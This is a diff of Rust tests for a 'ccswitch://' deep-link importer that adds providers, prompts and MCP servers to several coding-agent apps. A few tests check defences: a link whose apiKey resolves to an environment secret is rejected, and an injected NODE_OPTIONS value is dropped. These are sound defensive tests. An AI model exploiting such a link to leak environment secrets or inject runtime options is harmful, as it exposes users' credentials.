+fn test_omp_link_rejects_keys_that_resolve_through_the_environment() {
+    let _env = EnvVars::new().set("ccswitch_link_probe_secret", "real-secret");
+    let err = parse_deeplink_url(&link_with("omp", "apiKey", "ccswitch_link_probe_secret"))
+        .expect_err("omp would send the environment value to the link's endpoint");
+    assert!(err.to_string().contains("apiKey"), "{err}");
+}
+
+// =============================================================================
+// Activation Toggles, Prompt Import & Custom Icon Validation
+// =============================================================================
+
+#[test]
+#[serial_test::serial]
+fn test_import_prompt_allows_space_in_base64_content() {
+    let _test_home = TempUserHome::new();
+    let url = "ccswitch://v1/import?resource=prompt&app=codex&name=PromptPlus&content=Pj4+";
+    let request = parse_deeplink_url(url).unwrap();
+
+    // URL decoded content may have "+" become space
+    assert_eq!(request.content.as_deref(), Some("Pj4 "));
+
+    let db = Arc::new(Database::memory().expect("create memory db"));
+    let state = AppState::new(db);
+    let prompt_id = import_prompt_from_deeplink(&state, request.clone()).expect("import prompt");
+
+    let prompts = state.db.get_prompts(&AppType::Codex).expect("get prompts");
+    let prompt = prompts.get(&prompt_id).expect("prompt saved");
+    assert_eq!(prompt.content, ">>>");
+    assert_eq!(prompt.name, request.name.unwrap());
+}
+
+#[test]
+#[serial_test::serial]
+fn pi_link_enabled_toggle_controls_models_json_write() {
+    let _home = TempUserHome::new();
+    let _agent = crate::pi_config::test_support::TestAgentDir::new();
+
+    let import = |enabled: Option<bool>| {
+        let mut request =
+            parse_deeplink_url(&provider_link("pi", Some("openai_chat"))).expect("parse link");
+        request.enabled = enabled;
+        let state = AppState::new(Arc::new(Database::memory().expect("create memory db")));
+        let id = super::import_provider_from_deeplink(&state, request).expect("import Pi provider");
+        (state, id)
+    };
+
+    let (state, off_id) = import(Some(false));
+    assert!(state
+        .db
+        .get_provider_by_id(&off_id, &AppType::Pi)
+        .unwrap()
+        .is_some());
+    assert!(!crate::pi_config::pi_provider_exists(&off_id).unwrap());
+
+    for enabled in [Some(true), None] {
+        let (_state, id) = import(enabled);
+        let node = crate::pi_config::read_pi_native_provider(&id)
+            .unwrap()
+            .expect("node written to models.json");
+        assert_eq!(node["api"], "openai-completions", "{enabled:?}");
+    }
+}
+
+#[test]
+#[serial_test::serial]
+fn first_switch_mode_provider_respects_enabled_toggle() {
     let _home = TempUserHome::new();
 
-    for enabled in [Some(false), None] {
-        let (state, id) = import_claude_link(enabled);
+    let import = |enabled: Option<bool>| {
+        let mut request = parse_deeplink_url(&provider_link("claude", None)).expect("parse link");
+        request.enabled = enabled;
+        let state = AppState::new(Arc::new(Database::memory().expect("create memory db")));
+        let id = super::import_provider_from_deeplink(&state, request).expect("import provider");
+        (state, id)
+    };
 
+    for enabled in [Some(false), None] {
+        let (state, id) = import(enabled);
         assert!(state
             .db
             .get_provider_by_id(&id, &AppType::Claude)
@@ -1954,15 +1353,8 @@ fn test_first_switch_mode_provider_stays_inactive_when_the_toggle_is_off() {
             "{enabled:?}: the client config must not be written"
         );
     }
-}
 
-#[test]
-#[serial_test::serial]
-fn test_first_switch_mode_provider_takes_effect_when_the_toggle_is_on() {
-    let _home = TempUserHome::new();
-
-    let (state, id) = import_claude_link(Some(true));
-
+    let (state, id) = import(Some(true));
     let current = crate::mode::current::provider_for(
         &state.db,
         &AppType::Claude,
@@ -1975,42 +1367,33 @@ fn test_first_switch_mode_provider_takes_effect_when_the_toggle_is_on() {
     assert!(settings.contains("https://api.example.com/v1"));
 }
 
-// =============================================================================
-// 确认框下载的图标经前端重新编码后放进 icon，导入时按自定义图标的规则校验
-// =============================================================================
-
-fn png_data_uri(width: u32, height: u32) -> String {
-    use base64::Engine;
-    let mut out = Vec::new();
-    {
-        let mut encoder = png::Encoder::new(&mut out, width, height);
-        encoder.set_color(png::ColorType::Rgba);
-        encoder.set_depth(png::BitDepth::Eight);
-        let mut writer = encoder.write_header().unwrap();
-        writer
-            .write_image_data(&vec![0u8; (width * height * 4) as usize])
-            .unwrap();
-    }
-    format!(
-        "data:image/png;base64,{}",
-        base64::engine::general_purpose::STANDARD.encode(out)
-    )
-}
-
 #[test]
 #[serial_test::serial]
 fn test_import_stores_a_valid_custom_icon_and_rejects_a_broken_one() {
+    use base64::Engine;
+
     let _home = TempUserHome::new();
     let link = format!(
         "{}&iconUrl=https%3A%2F%2Fcdn.example.com%2Flogo.png",
         provider_link("claude", None)
     );
 
-    let icon = png_data_uri(96, 96);
+    let mut out = Vec::new();
+    {
+        let mut encoder = png::Encoder::new(&mut out, 96, 96);
+        encoder.set_color(png::ColorType::Rgba);
+        encoder.set_depth(png::BitDepth::Eight);
+        let mut writer = encoder.write_header().unwrap();
+        writer.write_image_data(&vec![0u8; 96 * 96 * 4]).unwrap();
+    }
+    let icon = format!(
+        "data:image/png;base64,{}",
+        base64::engine::general_purpose::STANDARD.encode(out)
+    );
+
     let mut request = parse_deeplink_url(&link).expect("parse link");
     request.icon = Some(icon.clone());
-    let db = Arc::new(Database::memory().expect("create memory db"));
-    let state = AppState::new(db);
+    let state = AppState::new(Arc::new(Database::memory().expect("create memory db")));
     let id = super::import_provider_from_deeplink(&state, request).expect("import provider");
     let stored = state
         .db
@@ -2020,108 +1403,37 @@ fn test_import_stores_a_valid_custom_icon_and_rejects_a_broken_one() {
     assert_eq!(stored.icon.as_deref(), Some(icon.as_str()));
 
     // 截断的 PNG：保存校验拒绝
-    let mut request = parse_deeplink_url(&link).expect("parse link");
-    request.icon = Some(icon[..icon.len() - 16].to_string());
-    let db = Arc::new(Database::memory().expect("create memory db"));
-    let state = AppState::new(db);
-    assert!(super::import_provider_from_deeplink(&state, request).is_err());
+    let mut broken = parse_deeplink_url(&link).expect("parse link");
+    broken.icon = Some(icon[..icon.len() - 16].to_string());
+    let state = AppState::new(Arc::new(Database::memory().expect("create memory db")));
+    assert!(super::import_provider_from_deeplink(&state, broken).is_err());
 }
 
-/// 不带任何用量字段、只填地址的请求。
-fn coding_plan_request(app: &str, endpoint: &str) -> DeepLinkImportRequest {
-    let mut request = usage_script_request("", None);
-    request.app = Some(app.to_string());
-    request.endpoint = Some(endpoint.to_string());
-    request.usage_script = None;
-    request
-}
-
-fn imported_usage_script(
-    app_type: AppType,
-    request: &DeepLinkImportRequest,
-) -> Option<UsageScript> {
-    use super::provider::build_provider_from_request;
-    build_provider_from_request(&app_type, request)
-        .unwrap()
-        .meta
-        .and_then(|meta| meta.usage_script)
-}
+// =============================================================================
+// App-Specific Behavior: Agy, Claude Desktop, Pi-Family, WorkBuddy, Copilot
+// =============================================================================
 
 #[test]
-fn test_deeplink_coding_plan_endpoint_enables_token_plan_by_default() {
-    // 和在应用里新建一样：套餐地址默认按套餐额度查询，所有应用一视同仁
-    for (app, app_type) in [
-        ("claude", AppType::Claude),
-        ("codex", AppType::Codex),
-        ("opencode", AppType::OpenCode),
-        ("hermes", AppType::Hermes),
-    ] {
-        let request = coding_plan_request(app, "https://api.kimi.com/coding/v1");
-        let script = imported_usage_script(app_type, &request)
-            .unwrap_or_else(|| panic!("{app} 应自动开启套餐用量"));
-        assert!(script.enabled, "{app}");
-        assert_eq!(script.template_type.as_deref(), Some("token_plan"));
-        assert_eq!(script.coding_plan_provider.as_deref(), Some("kimi"));
-        assert!(script.code.is_empty());
-    }
-}
-
-#[test]
-fn test_deeplink_coding_plan_respects_explicit_opt_out() {
-    let mut request = coding_plan_request("claude", "https://open.bigmodel.cn/api/anthropic");
-    request.usage_enabled = Some(false);
-    let script = imported_usage_script(AppType::Claude, &request).unwrap();
-    assert!(!script.enabled, "usageEnabled=false 必须照办");
-    assert_eq!(script.coding_plan_provider.as_deref(), Some("zhipu"));
-}
-
-#[test]
-fn test_deeplink_coding_plan_never_replaces_a_carried_script() {
-    let code = "export async function query() { return { cost: 0 }; }";
-    let mut request = usage_script_request(code, None);
-    request.endpoint = Some("https://api.kimi.com/coding/v1".to_string());
-    let script = imported_usage_script(AppType::Claude, &request).unwrap();
-    assert_eq!(script.code, code);
-    assert_eq!(script.template_type, None);
-}
-
-#[test]
-fn test_deeplink_volcengine_plan_is_preselected_but_off() {
-    // 火山查额度要账号级 AccessKey，链接里没有：只预选套餐，不默认启用
-    let request = coding_plan_request("opencode", "https://ark.cn-beijing.volces.com/api/plan/v3");
-    let script = imported_usage_script(AppType::OpenCode, &request).unwrap();
-    assert!(!script.enabled);
-    assert_eq!(script.coding_plan_provider.as_deref(), Some("volcengine"));
-
-    let mut request = coding_plan_request("claude", "https://ark.cn-beijing.volces.com/api/coding");
-    request.usage_enabled = Some(true);
-    let script = imported_usage_script(AppType::Claude, &request).unwrap();
-    assert!(script.enabled, "usageEnabled=true 必须照办");
-}
-
-#[test]
-fn test_deeplink_non_plan_and_zenmux_outside_claude_stay_off() {
-    let request = coding_plan_request("claude", "https://api.example.com/v1");
-    assert!(imported_usage_script(AppType::Claude, &request).is_none());
-
-    let request = coding_plan_request("codex", "https://zenmux.ai/api/v1");
-    assert!(imported_usage_script(AppType::Codex, &request).is_none());
-    let request = coding_plan_request("claude", "https://zenmux.ai/api/anthropic");
-    assert!(imported_usage_script(AppType::Claude, &request).is_some());
-}
-
-#[test]
-fn agy_deeplink_provider_config_precedence_and_protocol() {
-    let config = BASE64_URL_SAFE_NO_PAD.encode(serde_json::json!({
-        "env": {"GEMINI_API_KEY": "fixture", "GOOGLE_GEMINI_BASE_URL": "https://relay.example", "GEMINI_MODEL": "env-model", "NODE_OPTIONS": "untrusted"},
-        "config": {"model": {"name": "native-model"}, "unrelated": true}
-    }).to_string());
-    let url = format!("ccswitch://v1/import?resource=provider&app=agy&name=Test&config={config}&apiFormat=gemini_native");
-    let request = parse_deeplink_url(&url).unwrap();
-    let merged = parse_and_merge_config(&request).unwrap();
+fn agy_deeplink_provider_config_precedence_and_validation() {
+    let config = BASE64_URL_SAFE_NO_PAD.encode(
+        json!({
+            "env": {
+                "GEMINI_API_KEY": "fixture",
+                "GOOGLE_GEMINI_BASE_URL": "https://relay.example",
+                "GEMINI_MODEL": "env-model",
+                "NODE_OPTIONS": "untrusted"
+            },
+            "config": {"model": {"name": "native-model"}, "unrelated": true}
+        })
+        .to_string(),
+    );
+    let url = format!(
+        "ccswitch://v1/import?resource=provider&app=agy&name=Test&config={config}&apiFormat=gemini_native"
+    );
+    let merged = parse_and_merge_config(&parse_deeplink_url(&url).unwrap()).unwrap();
     assert_eq!(merged.model.as_deref(), Some("native-model"));
     assert_eq!(merged.api_key.as_deref(), Some("fixture"));
-    let provider = super::provider::build_provider_from_request(&AppType::Agy, &merged).unwrap();
+    let provider = build_provider_from_request(&AppType::Agy, &merged).unwrap();
     assert_eq!(
         provider.settings_config["config"]["model"]["name"],
         "native-model"
@@ -2132,6 +1444,7 @@ fn agy_deeplink_provider_config_precedence_and_protocol() {
     assert!(provider.settings_config["config"]
         .get("unrelated")
         .is_none());
+
     let explicit = parse_deeplink_url(&format!(
         "{url}&model=url-model&apiKey=url-key&endpoint=https://explicit.example"
     ))
@@ -2140,24 +1453,23 @@ fn agy_deeplink_provider_config_precedence_and_protocol() {
     assert_eq!(merged.model.as_deref(), Some("url-model"));
     assert_eq!(merged.api_key.as_deref(), Some("url-key"));
     assert_eq!(merged.endpoint.as_deref(), Some("https://explicit.example"));
+
     for format in ["anthropic", "openai_chat", "openai_responses"] {
         assert!(parse_deeplink_url(&format!(
             "ccswitch://v1/import?resource=provider&app=agy&name=Test&apiFormat={format}"
         ))
         .is_err());
     }
-}
 
-#[test]
-fn agy_deeplink_accepts_flat_env_and_rejects_invalid_env() {
-    for (config, valid) in [
+    // 扁平 env 允许；非对象 env 拒绝
+    for (cfg, valid) in [
         (
-            serde_json::json!({"GEMINI_API_KEY":"fixture", "GEMINI_BASE_URL":"https://relay.example", "GEMINI_MODEL":"flat-model"}),
+            json!({"GEMINI_API_KEY":"fixture", "GEMINI_BASE_URL":"https://relay.example", "GEMINI_MODEL":"flat-model"}),
             true,
         ),
-        (serde_json::json!({"env": []}), false),
+        (json!({"env": []}), false),
     ] {
-        let encoded = BASE64_URL_SAFE_NO_PAD.encode(config.to_string());
+        let encoded = BASE64_URL_SAFE_NO_PAD.encode(cfg.to_string());
         let request = parse_deeplink_url(&format!(
             "ccswitch://v1/import?resource=provider&app=agy&name=Test&config={encoded}"
         ))
@@ -2198,8 +1510,6 @@ fn agy_deeplink_mcp_import_merges_apps_and_writes_native_config() {
     )
     .unwrap();
     assert_eq!(native["mcpServers"]["fixture"]["command"], "echo");
-    assert!(parse_mcp_apps("agy,gemini").unwrap().agy);
-    assert!(parse_mcp_apps("agy,invalid").is_err());
 }
 
 #[test]
@@ -2210,7 +1520,10 @@ fn agy_deeplink_prompt_import_respects_activation() {
     let content = BASE64_URL_SAFE_NO_PAD.encode("Agy instructions");
     let path = crate::prompt_files::prompt_file_path(&AppType::Agy).unwrap();
     for enabled in [false, true] {
-        let request = parse_deeplink_url(&format!("ccswitch://v1/import?resource=prompt&app=agy&name=Test-{enabled}&content={content}&enabled={enabled}")).unwrap();
+        let request = parse_deeplink_url(&format!(
+            "ccswitch://v1/import?resource=prompt&app=agy&name=Test-{enabled}&content={content}&enabled={enabled}"
+        ))
+        .unwrap();
         let id = import_prompt_from_deeplink(&state, request).unwrap();
         assert_eq!(
             state.db.get_prompts(&AppType::Agy).unwrap()[&id].content,
@@ -2269,37 +1582,21 @@ fn agy_deeplink_enabled_key_provider_stays_out_of_live_files() {
 }
 
 #[test]
-fn skill_deeplink_is_a_shared_repository_not_an_agy_install() {
-    let state = AppState::new(Arc::new(Database::memory().unwrap()));
-    let request =
-        parse_deeplink_url("ccswitch://v1/import?resource=skill&repo=example/skills&app=agy")
-            .unwrap();
-    assert!(request.app.is_none());
-    assert_eq!(
-        super::skill::import_skill_from_deeplink(&state, request).unwrap(),
-        "example/skills"
-    );
-    assert!(state.db.get_all_installed_skills().unwrap().is_empty());
-}
-
-fn build_claude_desktop_from_url(
-    url: &str,
-) -> Result<crate::provider::Provider, crate::error::AppError> {
-    let request = parse_deeplink_url(url)?;
-    super::provider::build_provider_from_request(&AppType::ClaudeDesktop, &request)
-}
-
-#[test]
-fn claude_desktop_link_with_claude_models_becomes_a_direct_card() {
-    use crate::claude_desktop_config::{needs_routing, validate_provider};
+fn claude_desktop_link_classifies_direct_vs_proxy_cards() {
+    use crate::claude_desktop_config::{needs_routing, validate_provider, DEFAULT_PROXY_ROUTES};
     use crate::provider::ClaudeDesktopMode;
 
-    let provider = build_claude_desktop_from_url(
-        "ccswitch://v1/import?resource=provider&app=claude-desktop&name=Relay&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test&model=claude-sonnet-4-6&haikuModel=anthropic%2Fclaude-haiku-4-5",
-    )
-    .unwrap();
-    let meta = provider.meta.as_ref().unwrap();
+    let build = |extra: &str| {
+        let url = format!(
+            "ccswitch://v1/import?resource=provider&app=claude-desktop&name=Relay&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test{extra}"
+        );
+        let request = parse_deeplink_url(&url)?;
+        build_provider_from_request(&AppType::ClaudeDesktop, &request)
+    };
 
+    // 1. 全是 Claude 模型 -> 直连卡
+    let direct = build("&model=claude-sonnet-4-6&haikuModel=anthropic%2Fclaude-haiku-4-5").unwrap();
+    let meta = direct.meta.as_ref().unwrap();
     assert_eq!(meta.claude_desktop_mode, Some(ClaudeDesktopMode::Direct));
     assert_eq!(meta.api_format.as_deref(), Some("anthropic"));
     let mut routes: Vec<_> = meta
@@ -2315,110 +1612,67 @@ fn claude_desktop_link_with_claude_models_becomes_a_direct_card() {
             ("claude-sonnet-4-6", "claude-sonnet-4-6"),
         ]
     );
-    validate_provider(&provider).unwrap();
-    assert!(!needs_routing(&provider));
-}
+    validate_provider(&direct).unwrap();
+    assert!(!needs_routing(&direct));
 
-#[test]
-fn claude_desktop_link_without_models_stays_direct() {
-    use crate::claude_desktop_config::validate_provider;
-    use crate::provider::ClaudeDesktopMode;
-
-    let provider = build_claude_desktop_from_url(
-        "ccswitch://v1/import?resource=provider&app=claude-desktop&name=Relay&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test",
-    )
-    .unwrap();
-    let meta = provider.meta.as_ref().unwrap();
-
+    // 2. 不带模型 -> 直连卡（空路由表）
+    let empty_direct = build("").unwrap();
+    let meta = empty_direct.meta.as_ref().unwrap();
     assert_eq!(meta.claude_desktop_mode, Some(ClaudeDesktopMode::Direct));
     assert!(meta.claude_desktop_model_routes.is_empty());
-    validate_provider(&provider).unwrap();
-}
+    validate_provider(&empty_direct).unwrap();
 
-#[test]
-fn claude_desktop_link_with_other_models_becomes_a_mapping_card() {
-    use crate::claude_desktop_config::{needs_routing, validate_provider, DEFAULT_PROXY_ROUTES};
-    use crate::provider::ClaudeDesktopMode;
-
-    let provider = build_claude_desktop_from_url(
-        "ccswitch://v1/import?resource=provider&app=claude-desktop&name=GLM&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test&model=glm-4.6&haikuModel=glm-4.5-air",
-    )
-    .unwrap();
-    let meta = provider.meta.as_ref().unwrap();
-
+    // 3. 含非 Claude 模型 -> 映射卡（占满四档默认路由）
+    let mapped = build("&model=glm-4.6&haikuModel=glm-4.5-air").unwrap();
+    let meta = mapped.meta.as_ref().unwrap();
     assert_eq!(meta.claude_desktop_mode, Some(ClaudeDesktopMode::Proxy));
     assert_eq!(meta.api_format.as_deref(), Some("anthropic"));
-    let routes = &meta.claude_desktop_model_routes;
-    assert_eq!(routes.len(), DEFAULT_PROXY_ROUTES.len());
+    assert_eq!(
+        meta.claude_desktop_model_routes.len(),
+        DEFAULT_PROXY_ROUTES.len()
+    );
     for route in DEFAULT_PROXY_ROUTES {
         let expected = if route.env_key == "ANTHROPIC_DEFAULT_HAIKU_MODEL" {
             "glm-4.5-air"
         } else {
             "glm-4.6"
         };
-        let mapped = &routes[route.route_id];
-        assert_eq!(mapped.model, expected, "{}", route.route_id);
-        assert_eq!(mapped.label_override.as_deref(), Some(expected));
-        assert_eq!(mapped.supports_1m, None);
+        let entry = &meta.claude_desktop_model_routes[route.route_id];
+        assert_eq!(entry.model, expected, "{}", route.route_id);
+        assert_eq!(entry.label_override.as_deref(), Some(expected));
+        assert_eq!(entry.supports_1m, None);
     }
-    validate_provider(&provider).unwrap();
-    assert!(needs_routing(&provider));
-}
+    validate_provider(&mapped).unwrap();
+    assert!(needs_routing(&mapped));
 
-#[test]
-fn claude_desktop_link_with_non_anthropic_format_becomes_a_mapping_card() {
-    use crate::claude_desktop_config::validate_provider;
-    use crate::provider::ClaudeDesktopMode;
-
-    let provider = build_claude_desktop_from_url(
-        "ccswitch://v1/import?resource=provider&app=claude-desktop&name=Chat&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=sk-test&model=claude-sonnet-4-6&apiFormat=openai_chat",
-    )
-    .unwrap();
-    let meta = provider.meta.as_ref().unwrap();
-
+    // 4. 非 Anthropic 格式 -> 映射卡
+    let non_anthropic = build("&model=claude-sonnet-4-6&apiFormat=openai_chat").unwrap();
+    let meta = non_anthropic.meta.as_ref().unwrap();
     assert_eq!(meta.claude_desktop_mode, Some(ClaudeDesktopMode::Proxy));
     assert_eq!(meta.api_format.as_deref(), Some("openai_chat"));
     assert!(meta
         .claude_desktop_model_routes
         .values()
         .all(|route| route.model == "claude-sonnet-4-6"));
-    validate_provider(&provider).unwrap();
-}
+    validate_provider(&non_anthropic).unwrap();
 
-#[test]
-fn claude_desktop_link_with_non_anthropic_format_needs_a_model() {
-    let err = build_claude_desktop_from_url(
-        "ccswitch://v1/import?resource=provider&app=claude-desktop&name=Chat&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=sk-test&apiFormat=openai_responses",
-    )
-    .expect_err("a mapping card needs an upstream model");
+    // 5. 非 Anthropic 格式且缺少模型 -> 拒绝
+    let err = build("&apiFormat=openai_responses").expect_err("a mapping card needs a model");
     assert!(err.to_string().contains("model"), "{err}");
 }
 
-/// 名字带中文和下划线，检验 id 仍满足各家的原生 key 规则。
-fn import_pi_family_link(app: &str, api_format: Option<&str>) -> (AppState, String) {
-    let name: String = url::form_urlencoded::byte_serialize("中转_Relay".as_bytes()).collect();
-    let url = provider_link(app, api_format).replace("name=Example", &format!("name={name}"));
-    let request = parse_deeplink_url(&url).expect("parse link");
-    let db = Arc::new(Database::memory().expect("create memory db"));
-    let state = AppState::new(db);
-    let id = super::import_provider_from_deeplink(&state, request)
-        .unwrap_or_else(|err| panic!("import {app} provider: {err}"));
-    (state, id)
-}
-
-fn assert_slug_id(id: &str) {
-    assert!(id.starts_with("relay-"), "{id}");
-    assert!(
-        id.chars()
-            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-'),
-        "{id}"
-    );
-}
-
 #[test]
-fn test_pi_family_links_build_each_apps_minimal_node() {
-    use serde_json::json;
-
+fn additive_links_build_each_apps_minimal_card() {
+    assert_eq!(
+        build_from_link("pi", Some("anthropic")).settings_config,
+        json!({
+            "name": "Example",
+            "baseUrl": "https://api.example.com/v1",
+            "apiKey": "sk-test",
+            "api": "anthropic-messages",
+            "models": [{ "id": "example-model", "name": "example-model" }],
+        })
+    );
     assert_eq!(
         build_from_link("mcode", None).settings_config,
         json!({
@@ -2451,31 +1705,58 @@ fn test_pi_family_links_build_each_apps_minimal_node() {
         assert_eq!(model["model"], "example-model");
         assert!(model["max_context_size"].as_u64().is_some_and(|n| n > 0));
     }
-}
 
-#[test]
-#[serial_test::serial]
-fn test_omp_link_rejects_keys_that_resolve_through_the_environment() {
-    let previous = env::var_os("ccswitch_link_probe_secret");
-    env::set_var("ccswitch_link_probe_secret", "real-secret");
-    let result = parse_deeplink_url(&link_with("omp", "apiKey", "ccswitch_link_probe_secret"));
-    match previous {
-        Some(value) => env::set_var("ccswitch_link_probe_secret", value),
-        None => env::remove_var("ccswitch_link_probe_secret"),
+    // WorkBuddy：无 apiFormat 与 openai_chat 等价，不带协议字段、造不出官方登录卡，Key 裁剪空白
+    for format in [None, Some("openai_chat")] {
+        let provider = build_from_link("workbuddy", format);
+        assert_eq!(
+            provider.settings_config,
+            json!({
+                "vendor": "Example",
+                "url": "https://api.example.com/v1",
+                "apiKey": "sk-test",
+                "models": [{ "id": "example-model", "supportsToolCall": true }],
+            }),
+            "{format:?}"
+        );
+        assert!(provider.category.is_none(), "{format:?}");
     }
-    let err = result.expect_err("omp would send the environment value to the link's endpoint");
-    assert!(err.to_string().contains("apiKey"), "{err}");
+    let trimmed_req = parse_deeplink_url(&link_with("workbuddy", "apiKey", " sk-test ")).unwrap();
+    let wb = build_provider_from_request(&AppType::WorkBuddy, &trimmed_req).unwrap();
+    assert_eq!(wb.settings_config["apiKey"], "sk-test");
 }
 
 #[test]
 #[serial_test::serial]
-fn test_mcode_link_is_added_to_config_yaml() {
+fn pi_family_links_generate_slug_ids_and_write_native_configs() {
     let home = TempUserHome::new();
-    let _data = EnvVars::new().set("MINIMAX_DATA_DIR", home.path().join("minimax"));
+    let dsh_home = home.path().join("dsh");
+    let _env = EnvVars::new()
+        .set("MINIMAX_DATA_DIR", home.path().join("minimax"))
+        .set("DSH_HOME", &dsh_home)
+        .set("KIMI_CODE_HOME", home.path().join("kimi"));
+    let _omp_agent = crate::omp_config::test_support::TestAgentDir::new();
+    std::fs::create_dir_all(home.path().join(".zcode")).unwrap();
 
-    let (state, id) = import_pi_family_link("mcode", None);
+    // 名字带中文和下划线，检验 id 满足各家的 ASCII slug key 规则
+    let name: String = url::form_urlencoded::byte_serialize("中转_Relay".as_bytes()).collect();
+    let import = |app: &str, api_format: Option<&str>| {
+        let url = provider_link(app, api_format).replace("name=Example", &format!("name={name}"));
+        let request = parse_deeplink_url(&url).expect("parse link");
+        let state = AppState::new(Arc::new(Database::memory().expect("create memory db")));
+        let id = super::import_provider_from_deeplink(&state, request)
+            .unwrap_or_else(|err| panic!("import {app} provider: {err}"));
+        assert!(id.starts_with("relay-"), "{app}: {id}");
+        assert!(
+            id.chars()
+                .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-'),
+            "{app}: {id}"
+        );
+        (state, id)
+    };
 
-    assert_slug_id(&id);
+    // MCode
+    let (state, id) = import("mcode", None);
     assert!(state
         .db
         .get_provider_by_id(&id, &AppType::Mcode)
@@ -2484,18 +1765,9 @@ fn test_mcode_link_is_added_to_config_yaml() {
     let node = &crate::mcode_config::get_providers().unwrap()[&id];
     assert_eq!(node["options"]["baseURL"], "https://api.example.com/v1");
     assert_eq!(node["models"]["example-model"]["name"], "example-model");
-}
 
-#[test]
-#[serial_test::serial]
-fn test_dsh_link_is_added_to_every_profile() {
-    let home = TempUserHome::new();
-    let dsh_home = home.path().join("dsh");
-    let _data = EnvVars::new().set("DSH_HOME", &dsh_home);
-
-    let (_state, id) = import_pi_family_link("dsh", Some("anthropic"));
-
-    assert_slug_id(&id);
+    // DeepSeek Harness（同时写入 web / desktop 两个 profile）
+    let (_state, id) = import("dsh", Some("anthropic"));
     for profile in ["web", "desktop"] {
         let patch = std::fs::read_to_string(
             dsh_home
@@ -2511,18 +1783,9 @@ fn test_dsh_link_is_added_to_every_profile() {
             "{profile}: {patch}"
         );
     }
-}
 
-#[test]
-#[serial_test::serial]
-fn test_zcode_link_is_added_to_provider_config() {
-    let home = TempUserHome::new();
-    std::fs::create_dir_all(home.path().join(".zcode")).unwrap();
-
-    let (state, id) = import_pi_family_link("zcode", Some("anthropic"));
-
-    // ZCode 的 providerId 只认 `[A-Za-z0-9:_-]`，中文名要换成 slug
-    assert_slug_id(&id);
+    // ZCode
+    let (state, id) = import("zcode", Some("anthropic"));
     let stored = state
         .db
         .get_provider_by_id(&id, &AppType::ZCode)
@@ -2533,17 +1796,9 @@ fn test_zcode_link_is_added_to_provider_config() {
     assert_eq!(live["kind"], "anthropic");
     assert_eq!(live["options"]["baseURL"], "https://api.example.com/v1");
     assert!(live["models"].get("example-model").is_some(), "{live}");
-}
 
-#[test]
-#[serial_test::serial]
-fn test_kimi_link_namespaces_its_model_and_sets_a_context_size() {
-    let home = TempUserHome::new();
-    let _data = EnvVars::new().set("KIMI_CODE_HOME", home.path().join("kimi"));
-
-    let (state, id) = import_pi_family_link("kimi", None);
-
-    assert_slug_id(&id);
+    // Kimi（模型键带 `<id>/` 命名空间且有正数上下文窗口）
+    let (state, id) = import("kimi", None);
     let stored = state
         .db
         .get_provider_by_id(&id, &AppType::Kimi)
@@ -2559,17 +1814,9 @@ fn test_kimi_link_namespaces_its_model_and_sets_a_context_size() {
     assert_eq!(model["model"], "example-model");
     assert_eq!(model["provider"], id.as_str());
     assert!(model["max_context_size"].as_u64().is_some_and(|n| n > 0));
-}
 
-#[test]
-#[serial_test::serial]
-fn test_omp_link_is_added_to_models_yml() {
-    let _home = TempUserHome::new();
-    let _agent = crate::omp_config::test_support::TestAgentDir::new();
-
-    let (_state, id) = import_pi_family_link("omp", Some("openai_responses"));
-
-    assert_slug_id(&id);
+    // Oh My Pi
+    let (_state, id) = import("omp", Some("openai_responses"));
     let node = &crate::omp_config::get_providers().unwrap()[&id];
     assert_eq!(node["api"], "openai-responses");
     assert_eq!(node["models"][0]["id"], "example-model");
@@ -2609,68 +1856,43 @@ fn test_pi_family_inline_config_fills_each_apps_native_connection_fields() {
     }
 }
 
-// =============================================================================
-// WorkBuddy：卡片形状同 WorkBuddy 页面的编辑器，写入走页面「添加」同一条路径
-// =============================================================================
-
-#[test]
-fn test_workbuddy_link_builds_the_same_card_as_the_editor() {
-    // 自定义模型只走 Chat Completions：不写 apiFormat 与写 openai_chat 等价，卡片不带协议字段。
-    // 地址照链接原样写，和其他应用一致
-    for format in [None, Some("openai_chat")] {
-        let provider = build_from_link("workbuddy", format);
-        assert_eq!(
-            provider.settings_config,
-            serde_json::json!({
-                "vendor": "Example",
-                "url": "https://api.example.com/v1",
-                "apiKey": "sk-test",
-                "models": [{ "id": "example-model", "supportsToolCall": true }],
-            }),
-            "{format:?}"
-        );
-        // 链接造不出官方登录卡
-        assert!(provider.category.is_none(), "{format:?}");
-    }
-
-    // 编辑器保存时会去掉 Key 首尾的空白
-    let request = parse_deeplink_url(&link_with("workbuddy", "apiKey", " sk-test ")).unwrap();
-    let provider =
-        super::provider::build_provider_from_request(&AppType::WorkBuddy, &request).unwrap();
-    assert_eq!(provider.settings_config["apiKey"], "sk-test");
-}
-
-fn import_workbuddy_link(
-    state: &AppState,
-    enabled: Option<bool>,
-) -> Result<String, crate::error::AppError> {
-    let mut request = parse_deeplink_url(&provider_link("workbuddy", None)).expect("parse link");
-    request.enabled = enabled;
-    super::import_provider_from_deeplink(state, request)
-}
-
-fn read_workbuddy_models_json() -> serde_json::Value {
-    let text = std::fs::read_to_string(crate::workbuddy_config::config_path()).unwrap();
-    serde_json::from_str(&text).unwrap()
-}
-
 #[test]
 #[serial_test::serial]
-fn test_workbuddy_link_is_added_to_models_json() {
+fn workbuddy_link_import_toggle_and_model_ownership() {
     let home = TempUserHome::new();
     let _data = EnvVars::new().set("WORKBUDDY_CONFIG_DIR", home.path().join("workbuddy"));
+
+    // 开关关闭：只存库，不创建 models.json
+    let off_state = AppState::new(Arc::new(Database::memory().expect("create memory db")));
+    let mut off_req = parse_deeplink_url(&provider_link("workbuddy", None)).unwrap();
+    off_req.enabled = Some(false);
+    let off_id = super::import_provider_from_deeplink(&off_state, off_req).unwrap();
+    assert!(off_state
+        .db
+        .get_provider_by_id(&off_id, &AppType::WorkBuddy)
+        .unwrap()
+        .is_some());
+    assert!(!crate::workbuddy_config::config_path().exists());
+
+    // 默认开启：写入 models.json 并带上 ccSwitchProviderId
     let state = AppState::new(Arc::new(Database::memory().expect("create memory db")));
-
-    let id = import_workbuddy_link(&state, None).expect("import WorkBuddy provider");
-
+    let req = parse_deeplink_url(&provider_link("workbuddy", None)).unwrap();
